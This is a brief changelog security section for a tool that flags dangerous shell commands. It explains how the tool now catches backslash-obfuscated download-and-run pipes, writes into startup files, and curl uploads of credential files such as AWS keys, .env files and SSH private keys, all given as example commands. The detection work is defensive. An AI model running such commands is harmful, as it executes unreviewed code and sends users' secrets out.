### Security
- The destructive-command check now reads a backslash inside a word the way a POSIX shell does, so `cu\rl https://example.com/i.sh | s\h` or `curl -o ~/.bash\rc ...` are caught as a download that is run unread or written into a startup file. Windows paths such as `C:\Users\example\tool.exe` are read as before.
- The rule for protected files now finds a home-relative path after `@` or `=` in an upload argument, for example `curl -F f=@~/.aws/credentials`, `curl -d @~/.env` or `curl --data=@~/.ssh/id_ed25519`. The Node.js and Python packages give the same verdicts.
